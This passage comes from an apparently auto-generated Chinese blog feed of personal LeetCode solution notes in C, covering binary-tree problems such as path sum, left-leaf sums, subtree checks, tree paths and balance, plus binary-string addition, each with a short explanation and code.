    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/path-sum/</p><p>这题用到了回溯的思想，若使用迭代法，则每次回溯时需要减去刚才保存的节点值，再继续；而递归本身就有回溯的功能</p><ul><li>当遍历到叶子节点时，比较路径上的节点值之和与目标值是否相等</li><li>若不相等则返回<code>false</code>，回到上一层继续遍历</li><li>若相等则返回<code>true</code>，这里定义两个<code>bool</code>类型变量存放左、右路径的布尔值</li></ul><blockquote><p>注意这里不能直接定义<code>bool l = preOrder(root-&gt;left, targetSum, path);</code>，同时需要注意对<code>l</code>和<code>r</code>进行初始化。</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">preOrder</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> targetSum, <span class="type">int</span> path)</span> {</span><br><span class="line">    <span class="type">bool</span> l=<span class="literal">false</span>, r = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(root)</span><br><span class="line">        path += root-&gt;val;</span><br><span class="line">    <span class="keyword">if</span>(!root-&gt;left &amp;&amp; !root-&gt;right) {</span><br><span class="line">        <span class="keyword">if</span>(path==targetSum)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">        l = preOrder(root-&gt;left, targetSum, path);</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">        r = preOrder(root-&gt;right, targetSum, path);</span><br><span class="line">    <span class="keyword">return</span> l || r;</span><br><span class="line">}</span><br><span class="line"><span class="type">bool</span> <span class="title function_">hasPathSum</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> targetSum)</span> {</span><br><span class="line">    <span class="type">int</span> path = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> preOrder(root, targetSum, path);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>找树左下角的值</title>
    <link href="/2024/02/28/%E6%89%BE%E6%A0%91%E5%B7%A6%E4%B8%8B%E8%A7%92%E7%9A%84%E5%80%BC/"/>
    <url>/2024/02/28/%E6%89%BE%E6%A0%91%E5%B7%A6%E4%B8%8B%E8%A7%92%E7%9A%84%E5%80%BC/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/find-bottom-left-tree-value</p><p>这题用迭代法更方便，迭代法思路：每次记录当前层的第一个节点，直到最后一层。</p><p>我使用的是递归法，思路如下：</p><ul><li><p>先定义一个全局变量（结构体）用于存放最深的层数和该层最左边节点的值</p></li><li><p>使用前序遍历，按照“根-左-右”顺序遍历二叉树</p></li><li><p>按照该顺序遍历，若当前节点为叶节点，则比较深度大小判断是否需要记录当前节点值</p><blockquote><p>这里<strong>不需要</strong>判断是左叶子节点还是右叶子节点，因为同一层的叶子节点会先记录左节点，然后再遍历右节点，此时深度值已经更新，所以同一层的右节点<strong>不会记录</strong>下来</p></blockquote></li><li><p>若当前节点有孩子节点，则继续遍历</p></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">Node</span> {</span></span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="type">int</span> depth;</span><br><span class="line">}Node;</span><br><span class="line">Node res; <span class="comment">//全局变量，存放结果</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">preOrder</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> depth)</span> {</span><br><span class="line">    <span class="keyword">if</span>(!root) </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">if</span>(!root-&gt;left &amp;&amp; !root-&gt;right) {</span><br><span class="line">        depth++; <span class="comment">//注意深度值的更新</span></span><br><span class="line">        <span class="keyword">if</span>(depth &gt; res.depth) {</span><br><span class="line">            res.depth = depth;</span><br><span class="line">            res.val = root-&gt;val;</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(root-&gt;left)</span><br><span class="line">        preOrder(root-&gt;left, depth+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(root-&gt;right)</span><br><span class="line">        preOrder(root-&gt;right, depth+<span class="number">1</span>);</span><br><span class="line">    </span><br><span class="line">}</span><br><span class="line"><span class="type">int</span> <span class="title function_">findBottomLeftValue</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span> {</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    res.depth = <span class="number">1</span>;</span><br><span class="line">    res.val = root-&gt;val; <span class="comment">//初始化全局变量</span></span><br><span class="line">    preOrder(root, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> res.val;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>左叶子之和</title>
    <link href="/2024/02/28/%E5%B7%A6%E5%8F%B6%E5%AD%90%E4%B9%8B%E5%92%8C/"/>
    <url>/2024/02/28/%E5%B7%A6%E5%8F%B6%E5%AD%90%E4%B9%8B%E5%92%8C/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/sum-of-left-leaves</p><p>又是递归类的题目，这题我花了很长时间还是有测试用例不正确<span class="github-emoji"><span>😓</span><img src="https://github.githubassets.com/images/icons/emoji/unicode/1f613.png?v8" aria-hidden="true" onerror="this.parent.classList.add('github-emoji-fallback')"></span>，在对右子树进行处理时有问题，导致累加值直接清0。</p><p>修改后，正确代码如下：</p><ul><li><code>flag</code>用于判断当前为左子树还是右子树</li><li>这里<code>preOrder</code>函数类型为<code>void</code>就不会出现返回值上的错误了（之前我是将其定义为<code>int</code>类型，在返回值上出了问题）</li><li>这里的<code>sum</code>，我传递的是指针，因为其值在不断变化，而<code>void</code>类型函数不返回值，所以用指针比较方便</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">preOrder</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span> *sum, <span class="type">int</span> flag)</span> {</span><br><span class="line">    <span class="keyword">if</span> (!root) </span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!root-&gt;left &amp;&amp; !root-&gt;right &amp;&amp; flag == <span class="number">0</span>) <span class="comment">// 左叶子节点</span></span><br><span class="line">        *sum += root-&gt;val;</span><br><span class="line">    <span class="keyword">if</span> (root-&gt;left != <span class="literal">NULL</span>)</span><br><span class="line">        preOrder(root-&gt;left,sum, <span class="number">0</span>); <span class="comment">// 递归处理左子树</span></span><br><span class="line">    <span class="keyword">if</span> (root-&gt;right != <span class="literal">NULL</span>)</span><br><span class="line">        preOrder(root-&gt;right,sum, <span class="number">1</span>); <span class="comment">// 递归处理右子树</span></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(flag==<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">sumOfLeftLeaves</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span>{</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span>* res = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>));</span><br><span class="line">    *res = <span class="number">0</span>;</span><br><span class="line">    preOrder(root-&gt;left, res, <span class="number">0</span>); <span class="comment">//左子树的左叶子节点之和</span></span><br><span class="line">    preOrder(root-&gt;right, res, <span class="number">1</span>); <span class="comment">//右子树的左叶子节点之和</span></span><br><span class="line">    <span class="keyword">return</span> *res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>另一棵树的子树</title>
    <link href="/2024/02/27/%E5%8F%A6%E4%B8%80%E6%A3%B5%E6%A0%91%E7%9A%84%E5%AD%90%E6%A0%91/"/>
    <url>/2024/02/27/%E5%8F%A6%E4%B8%80%E6%A3%B5%E6%A0%91%E7%9A%84%E5%AD%90%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/subtree-of-another-tree</p><p>这题与<a href="https://hxt616.github.io/2024/02/26/%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/">对称二叉树</a>类似，不过这题复杂一点，除了在比较两个树时进行先序遍历，还需要对第一棵树的子树进行先序遍历，判断该树的子树是否满足条件</p><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">bool</span> <span class="title function_">compare</span><span class="params">(<span class="keyword">struct</span> TreeNode* p, <span class="keyword">struct</span> TreeNode* q)</span> {</span><br><span class="line">    <span class="keyword">if</span>(p!=<span class="literal">NULL</span> &amp;&amp; q==<span class="literal">NULL</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(p==<span class="literal">NULL</span> &amp;&amp; q!=<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(p==<span class="literal">NULL</span> &amp;&amp; q==<span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(p-&gt;val != q-&gt;val)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="type">bool</span> left_child = compare(p-&gt;left, q-&gt;left);</span><br><span class="line">    <span class="type">bool</span> right_child = compare(p-&gt;right, q-&gt;right);</span><br><span class="line">    <span class="keyword">return</span> left_child &amp;&amp; right_child;</span><br><span class="line">}</span><br><span class="line"><span class="type">bool</span> <span class="title function_">firstOrder</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="keyword">struct</span> TreeNode* subRoot)</span> {<span class="comment">//遍历第一棵树的子树</span></span><br><span class="line">    <span class="type">bool</span> m = compare(root, subRoot); <span class="comment">//判断当前子树是否满足条件</span></span><br><span class="line">    <span class="type">bool</span> l = <span class="literal">false</span>;</span><br><span class="line">    <span class="type">bool</span> r = <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(root){</span><br><span class="line">        l = firstOrder(root-&gt;left, subRoot); <span class="comment">//遍历左子树</span></span><br><span class="line">        r = firstOrder(root-&gt;right, subRoot); <span class="comment">//遍历右子树</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">return</span> m || l || r; <span class="comment">//只要有一个子树满足条件即可</span></span><br><span class="line">}</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isSubtree</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="keyword">struct</span> TreeNode* subRoot)</span>{</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> firstOrder(root, subRoot);</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二叉树的所有路径</title>
    <link href="/2024/02/27/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%89%80%E6%9C%89%E8%B7%AF%E5%BE%84/"/>
    <url>/2024/02/27/%E4%BA%8C%E5%8F%89%E6%A0%91%E7%9A%84%E6%89%80%E6%9C%89%E8%B7%AF%E5%BE%84/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/binary-tree-paths</p><p>使用深度优先搜索——先序遍历，通过递归不断回溯，找到所有的路径</p><ul><li>先判断root是否是空节点</li><li>然后判断root的孩子节点</li><li>若孩子节点不为空，则将当前节点值<strong>加入<code>sta</code>数组</strong>（记录路径,可看作栈），然后分别遍历当前节点的左子树和右子树</li><li>若孩子节点为空，说明当前节点是叶节点（并没有加入<code>sta</code>数组），使用<code>sprintf</code>拼接路径，然后再将当前叶节点加入路径</li><li>然后将当前路径加入路径数组<code>ans</code></li></ul><blockquote><p><code>spritnf</code>返回了本次函数调用最终打印到字符缓冲区中的字符数目</p></blockquote><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">path</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">char</span>** ans, <span class="type">int</span> *returnSize, <span class="type">int</span>* sta, <span class="type">int</span> top)</span> { <span class="comment">//top可当作sta的栈顶</span></span><br><span class="line">    <span class="keyword">if</span>(root != <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="keyword">if</span>(root-&gt;left==<span class="literal">NULL</span> &amp;&amp; root-&gt;right==<span class="literal">NULL</span>) {</span><br><span class="line">            <span class="type">char</span>* tmp = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="number">101</span>);</span><br><span class="line">            <span class="type">int</span> len = <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;top; i++) {</span><br><span class="line">                len += <span class="built_in">sprintf</span>(tmp+len, <span class="string">"%d-&gt;"</span>, sta[i]);  <span class="comment">//记录当前路径字符串的长度</span></span><br><span class="line">                <span class="comment">//sprintf返回的是当前写入数组的元素个数</span></span><br><span class="line"></span><br><span class="line">            }</span><br><span class="line">            <span class="built_in">sprintf</span>(tmp+len, <span class="string">"%d"</span>, root-&gt;val); <span class="comment">//将当前叶结点加入路径</span></span><br><span class="line">            ans[(*returnSize)++] = tmp; <span class="comment">//加入路径数组</span></span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span> {</span><br><span class="line">            sta[top++] = root-&gt;val; <span class="comment">//将当前节点值入栈</span></span><br><span class="line">            path(root-&gt;left, ans, returnSize, sta, top);</span><br><span class="line">            path(root-&gt;right, ans, returnSize, sta, top);</span><br><span class="line">        }</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"><span class="type">char</span>** <span class="title function_">binaryTreePaths</span><span class="params">(<span class="keyword">struct</span> TreeNode* root, <span class="type">int</span>* returnSize)</span> {</span><br><span class="line">    <span class="type">char</span>** ans = (<span class="type">char</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>*)*<span class="number">50</span>);</span><br><span class="line">    *returnSize = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> sta[<span class="number">101</span>]; <span class="comment">//存放路径（路径上的节点值）</span></span><br><span class="line">    path(root, ans, returnSize, sta, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>平衡二叉树</title>
    <link href="/2024/02/27/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2024/02/27/%E5%B9%B3%E8%A1%A1%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/balanced-binary-tree/</p><p>利用递归的思想：</p><ul><li>从最深的两个子树开始判断</li><li>每次判断两个子树的高度差是否大于1</li><li>若小于等于1，则返回上一层，同时记录当前子树高度（左右子树高度中的较大值）</li><li>若大于1，则返回-1（若左右子树高度为-1，则一直返回-1）</li><li>重复上述步骤</li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">getHeight</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span> {</span><br><span class="line">    <span class="keyword">if</span>(!root)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> leftdep = getHeight(root-&gt;left); <span class="comment">//左子树高度</span></span><br><span class="line">    <span class="keyword">if</span>(leftdep == <span class="number">-1</span>) <span class="comment">//若左子树高度为-1，则一直返回-1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="type">int</span> rightdep = getHeight(root-&gt;right); <span class="comment">//右子树高度</span></span><br><span class="line">    <span class="keyword">if</span>(rightdep == <span class="number">-1</span>) </span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">abs</span>(leftdep-rightdep) &gt; <span class="number">1</span>) <span class="comment">//若两个子树高度差大于1，则返回-1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">        <span class="keyword">return</span> (leftdep &gt; rightdep ? leftdep:rightdep)+<span class="number">1</span>; <span class="comment">//否则返回子树较大值</span></span><br><span class="line">}</span><br><span class="line"><span class="type">bool</span> <span class="title function_">isBalanced</span><span class="params">(<span class="keyword">struct</span> TreeNode* root)</span> {</span><br><span class="line">    <span class="type">int</span> res = getHeight(root);</span><br><span class="line">    <span class="keyword">if</span>(res==<span class="number">-1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>二进制求和</title>
    <link href="/2024/02/27/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%B1%82%E5%92%8C/"/>
    <url>/2024/02/27/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%B1%82%E5%92%8C/</url>
    
    <content type="html"><![CDATA[<p>题目地址：https://leetcode.cn/problems/add-binary/</p><p>这题可以通过模拟二进制求和的步骤来实现：</p><ul><li><p>先为结果数组分配空间，注意分配的空间要比最大数组还多<strong>两个字节</strong>，因为两个数相加可能有进位，同时<code>max_length</code>不包括'0'，所以要预留一个字节。</p></li><li><p>定义<code>flag</code>用于判断是否有<strong>进位</strong></p></li><li><p>使用for循环从后往前遍历两个数组，将对应字符转为整数，然后将两个数字和<code>flag</code>进行相加，得到<code>sum</code></p></li><li><p>若<code>sum%2 == 1</code>，则当前位置为'1'；若<code>sum/2 &gt; 0</code>，则有进位</p></li><li><p>循环结束后，将数组最后一位置为'\0'，表示数组结束</p></li><li><p><code>reverse()</code>函数用于将上述结果数组进行倒序，得到正确答案</p><blockquote><p><code>big[l1 - i - 1] - '0'</code>表示<code>big[l1-i-1]</code>字符对应的整数</p></blockquote></li></ul><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span>* <span class="title function_">sum</span><span class="params">(<span class="type">char</span>* big, <span class="type">char</span>* small)</span> {</span><br><span class="line">    <span class="type">int</span> l1 = <span class="built_in">strlen</span>(big);</span><br><span class="line">    <span class="type">int</span> l2 = <span class="built_in">strlen</span>(small);</span><br><span class="line">    <span class="type">int</span> max_length = l1 &gt; l2 ? l1 : l2;</span><br><span class="line">    <span class="type">char</span>* res = (<span class="type">char</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">char</span>) * (max_length + <span class="number">2</span>)); <span class="comment">//给结果数组分配空间，多余的2个单位：一个给进位，一个给'\0'</span></span><br><span class="line">    <span class="keyword">if</span> (res == <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">// Failed to allocate memory</span></span><br><span class="line">    }</span><br><span class="line">    <span class="type">int</span> flag = <span class="number">0</span>; <span class="comment">//判断是否有进位</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; max_length; i++) {</span><br><span class="line">        <span class="type">int</span> digit1 = (i &lt; l1) ? (big[l1 - i - <span class="number">1</span>] - <span class="string">'0'</span>) : <span class="number">0</span>; <span class="comment">//若位数不够，则为0（高位补0）</span></span><br><span class="line">        <span class="type">int</span> digit2 = (i &lt; l2) ? (small[l2 - i - <span class="number">1</span>] - <span class="string">'0'</span>) : <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> sum = digit1 + digit2 + flag; <span class="comment">//计算当前 位 相加的结果</span></span><br><span class="line">        res[i] = (sum % <span class="number">2</span>) + <span class="string">'0'</span>; <span class="comment">//根据sum值判断当前 位 的值</span></span><br><span class="line">        flag = sum / <span class="number">2</span>;  <span class="comment">//若sum&gt;2，则有进位</span></span><br><span class="line">    }</span><br><span class="line">    <span class="keyword">if</span> (flag == <span class="number">1</span>) {</span><br><span class="line">        res[i] = <span class="string">'1'</span>;</span><br><span class="line">        i++;</span><br><span class="line">    }</span><br><span class="line">    res[i] = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">reverse</span><span class="params">(<span class="type">char</span>* res)</span> {</span><br><span class="line">    <span class="type">int</span> len = <span class="built_in">strlen</span>(res);</span><br><span class="line">    <span class="type">char</span> tmp;</span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;len/<span class="number">2</span>; i++) {</span><br><span class="line">        tmp = res[i];</span><br><span class="line">        res[i] = res[len<span class="number">-1</span>-i];</span><br><span class="line">        res[len<span class="number">-1</span>-i] = tmp;</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">addBinary</span><span class="params">(<span class="type">char</span>* a, <span class="type">char</span>* b)</span> {</span><br><span class="line">    <span class="type">char</span>* res;</span><br><span class="line">    res = sum(a, b);</span><br><span class="line">    <span class="keyword">if</span> (res == <span class="literal">NULL</span>) {</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>; <span class="comment">// Memory allocation failure</span></span><br><span class="line">    }</span><br><span class="line">    reverse(res);</span><br><span class="line">    <span class="keyword">return</span> res;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>]]></content>
    
    
    <categories>
      
      <category>代码随想录</category>
      
      <category>LeetCode</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C</tag>
      
      <tag>数据结构</tag>
      
      <tag>LeetCode</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>对称二叉树</title>
    <link href="/2024/02/26/%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/"/>
    <url>/2024/02/26/%E5%AF%B9%E7%A7%B0%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    
